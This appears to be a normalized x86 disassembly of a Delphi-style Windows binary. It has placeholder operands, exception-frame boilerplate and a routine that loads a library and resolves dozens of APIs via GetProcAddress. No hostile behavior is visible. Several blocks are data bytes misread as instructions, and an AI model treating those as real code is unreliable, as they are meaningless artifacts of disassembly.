lea ecx [ esp + 0x8 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0xc ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x74 ]
pop edx
pop ebx
retn
sub_45c95c
push ebx
push ecx
lea edx [ eax + 0x18 ]
push edx
lea edx [ eax + 0x20 ]
push edx
lea ecx [ esp + 0x8 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0xc ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x70 ]
pop edx
pop ebx
retn
sub_45c980
push ebx
mov ebx eax
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0xc ] 0xffffffff
test dl dl
je r-xdata
lea eax [ ebx + 0x18 ]
call sub_403eb4
xor eax eax
mov [ ebx + 0x20 ] eax
pop ebx
retn
lea eax [ ebx + 0x14 ]
call sub_403eb4
xor eax eax
mov [ ebx + 0x1c ] eax
sub_45c9b0
push ebx
push esi
push ecx
mov esi eax
push 0x0
mov eax [ esi + 0x14 ]
push eax
mov eax [ esi + 0x1c ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx 0x2
mov edx [ esi + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx eax
mov [ esp + 0x4 ] 0x2740
lea ecx [ esp + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_458c44
mov ebx eax
xor bl 0x1
test bl bl
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_45c938
sub_45ca04
push ebx
push esi
push edi
push ebp
mov ebp eax
xor ebx ebx
mov edi [ ebp + 0x28 ]
mov esi [ ebp + 0x24 ]
sub esi edi
jg r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
dec esi
dec edi
inc esi
jne r-xdata
mov bl 0x1
jmp r-xdata
mov [ ebp + 0x1c ] edi
mov eax ebp
call sub_45c9b0
test al al
je r-xdata
sub_45ca34
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45ca59
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ca60
retn
sub_45ca6c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45ca91
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ca98
retn
sub_45caa4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45cac9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cad0
retn
sub_45cadc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45cb01
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cb08
retn
sub_45cb14
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45cb39
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cb40
retn
sub_45cb4c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45cb71
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cb78
retn
sub_45cb84
ror bl 0x1
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 8 + 0x45 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 8 ] ch
inc ebp
add [ eax + eax ] dh
add [ eax ] bh
mov ah 0x45
add [ esp + 0x41 ] cl
add [ ebx + esi ] dh
inc eax
add [ eax + 0x3c00419d ] ah
xor eax [ eax ]
xor [ ebx ] dh
inc eax
add [ eax - 0x53ffbfd0 ] dl
xor [ eax ] al
enter 0x45d2 0x0
add [ ebx ] 0x0
or [ ebx + 0x6f ] edx
arpl [ ebx + 0x73 ] bp
dec ecx
outsb
outsw
add [ eax ] dl
inc eax
add [ eax + eax ] ch
[ eax + eax ]
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
adc [ ecx + 0x41 ] al
add [ eax + 0x41 ] dl
add [ eax + eax * 2 ] ch
inc ecx
add [ ecx ] ch
inc ecx
add [ ebx + edx * 8 ] cl
inc ebp
add [ ecx ] bh
inc ecx
add [ edx ] dh
inc ecx
add [ esp + 0x41 ] ah
add [ ecx + 0x41 ] cl
add [ ecx + 0x41 ] al
add [ esp + 0x41 ] ch
add al al
rol [ ebp ] 0x1
in al 0xb2
inc ebp
add [ ebx + esi * 4 ] bl
inc ebp
add [ ebx + esi * 4 + 0x45 ] cl
add [ ebp + esi * 4 + 0x45 ] dl
add [ eax ] bh
int 0x45
add al cl
into
inc ebp
add [ eax + edx * 8 - 0x2f03ffbb ] ch
inc ebp
add [ ecx + edx * 8 ] ch
inc ebp
add [ eax ] bh
rol [ ebp ] 0x1
mov eax 0x120045d1
push esp
dec ecx
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
inc esp
int3
sub_45ccc4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0xcd
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ah
int 0x45
add [ edx + ebx * 4 - 0x2ccbffbf ] cl
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + r-xdata ] dl
add [ eax ] al
adc [ ecx + ecx * 2 + 0x64 ] dl
inc ebx
outsd
outsb
outsb
arpl [ gs : esp + edx * 2 + 0x68 ] si
jb r-xdata
inc ecx
add [ eax ] ch
xor eax [ eax ]
fcomp [ ecx + 0x33380041 ]
inc eax
add [ ebx + esi ] bh
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
jo r-xdata
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
mov eax [ ebp - 0x4 ]
call sub_419c08
mov eax [ r-xdata ]
call sub_45aed0
test al al
je r-xdata
popad
nop
add [ eax ] cl
add [ eax ] al
jo r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al 0x0
or [ ebp + 0x73 ] dl
dec esi
popad
insb
lea eax [ eax ]
or al 0xcd
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx * 8 + 0x45 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int 0x45
inc ecx
mov edi 0x7d
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
mov edx 0x7d
call sub_45a658
mov edi eax
jmp r-xdata
cmp edi esi
jge r-xdata
lea esi [ edi + 0x1 ]
test bl bl
je r-xdata
mov eax esi
call sub_45a948
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax edi
call sub_45a948
sub esi edi
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_419c30
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_419c38
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_404174
test eax eax
jle r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45ae8c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
lea esi [ edi + 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cea4
mov eax [ ebp - 0x4 ]
call sub_4030f8
retn
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
jmp r-xdata
cmp edi esi
jl r-xdata
xor esi esi
jmp r-xdata
sub_45cd54
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45ceba
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi 0xfffffffe
sete bl
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4198a0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45ce9d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
mov eax [ ebp - 0x4 ]
call sub_419c08
mov eax [ r-xdata ]
call sub_45aed0
test al al
je r-xdata
mov edi 0x7d
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
mov edx 0x7d
call sub_45a658
mov edi eax
jmp r-xdata
cmp edi esi
jge r-xdata
lea esi [ edi + 0x1 ]
test bl bl
je r-xdata
mov eax esi
call sub_45a948
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax edi
call sub_45a948
sub esi edi
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_419c30
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_419c38
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_404174
test eax eax
jle r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45ae8c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
lea esi [ edi + 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cea4
mov eax [ ebp - 0x4 ]
call sub_4030f8
retn
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
jmp r-xdata
cmp edi esi
jl r-xdata
xor esi esi
jmp r-xdata
sub_45cec8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_45d099
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45d2a0
mov al [ eax + 0x7c ]
dec eax
sub al 0x3
jae r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_403f4c
mov edi [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45d2a0
mov edx [ eax + 0x6c ]
lea eax [ ebp - 0x10 ]
call sub_403f4c
mov eax [ ebp - 0x4 ]
call sub_45d2a0
mov edi [ eax + 0x74 ]
jmp r-xdata
lea ecx [ ebp - 0x1c ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x10 ]
call sub_458d84
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx edi
call sub_45c6c0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jne r-xdata
push 0x0
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45b228
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push esi
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_45b520
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x68 ]
xor ecx ecx
mov edx 0x1
mov eax ebx
call sub_45c414
lea eax [ ebx + 0x14 ]
mov edx [ ebp + 0x18 ]
call sub_403f08
mov eax [ ebp + 0x14 ]
mov [ ebx + 0x1c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x24 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x28 ] eax
mov eax ebx
call sub_45c5a0
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x10 ]
call sub_459230
test al al
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_45b228
cmp esi 0xffffffff
je r-xdata
mov eax [ rw-data ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx 0x1
mov edx 0x6
call sub_45c534
mov eax [ r-xdata ]
call sub_45aed0
test al al
je r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_458c38
jmp r-xdata
push ebp
mov eax 0x1d4c0
call sub_45cd54
pop ecx
jmp r-xdata
push ebp
mov eax esi
call sub_45cd54
pop ecx
mov eax [ ebp - 0x4 ]
call sub_45d2a0
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_45c0d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d0a0
lea eax [ ebp - 0x1c ]
call sub_403eb4
lea eax [ ebp - 0x10 ]
call sub_403eb4
retn
sub_45d0c0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45b110
mov [ esi + 0x6c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_45d0fc
push ebx
mov ebx eax
mov eax ebx
call sub_45b558
mov eax [ ebx + 0x68 ]
test eax eax
jne r-xdata
mov dl 0x1
call sub_45c980
pop ebx
retn
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45c750
mov [ ebx + 0x68 ] eax
pop ebx
retn
sub_45d138
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45d1a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x48 ]
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
push 0x0
mov edx esi
mov ecx edi
mov eax [ ebx + 0x68 ]
call sub_45c4ec
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d1af
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_45d1b8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45d228
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x48 ]
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
push 0x0
mov edx esi
mov ecx edi
mov eax [ ebx + 0x68 ]
call sub_45c510
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d22f
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_45d238
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov [ ebx + 0x70 ] esi
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x70 ]
test eax eax
je r-xdata
mov eax ebx
call sub_45d2a0
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax esi
mov [ ebx + 0x70 ] eax
mov edx ebx
call sub_419dac
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_45d2a0
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
xor eax eax
mov [ ebx + 0x70 ] eax
lea eax [ ebx + 0x70 ]
call sub_40cc80
mov eax [ ebx + 0x70 ]
mov [ eax + 0x80 ] ebx
pop esi
pop ebx
retn
sub_45d2a0
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x70 ]
pop ebx
retn
cmp [ ebx + 0x70 ] 0x0
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45b880
mov [ ebx + 0x70 ] eax
sub_45d2c8
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax [ esi + 0x70 ]
test eax eax
je r-xdata
lea eax [ esi + 0x68 ]
call sub_40cc80
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45b528
test bl bl
jle r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
lea eax [ esi + 0x70 ]
call sub_40cc80
sub_45d30c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_419ff8
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x70 ]
jne r-xdata
xor eax eax
mov [ esi + 0x70 ] eax
sub_45d334
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_4036ac#5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov edx eax
mov [ ebp - 0xc ] 0x2719
mov [ ebp - 0x8 ] 0x2736
lea ecx [ ebp - 0xc ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_458c44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_419c30
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45d39c
mov eax [ ebp - 0x4 ]
add eax 0x44
mov edx [ ebx + 0x4 ]
call sub_403f08
call sub_4038e8
mov eax [ ebp - 0x4 ]
call sub_419c30
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45d3c0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45d3e5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d3ec
retn
sub_45d3f8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404364
xor eax eax
push ebp
push sub_45d44f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40417c
lea eax [ ebp - 0x4 ]
call j_sub_404380
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d456
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_45d468
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404364
xor eax eax
push ebp
push sub_45d4a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45d3f8
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d4ad
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_45d4b4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404364
xor eax eax
push ebp
push sub_45d50b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40417c
lea eax [ ebp - 0x4 ]
call j_sub_404380
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d512
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_45d524
push ebx
mov bl 0x1
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
mov eax ebx
pop ebx
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d468
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d468
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d468
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d468
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d468
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d468
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d4b4
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d4b4
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d4b4
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d4b4
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d4b4
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d468
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d468
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d4b4
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d4b4
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d4b4
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d4b4
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d4b4
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d4b4
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d4b4
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d4b4
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
mov eax r-xdata
call sub_45d3f8
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
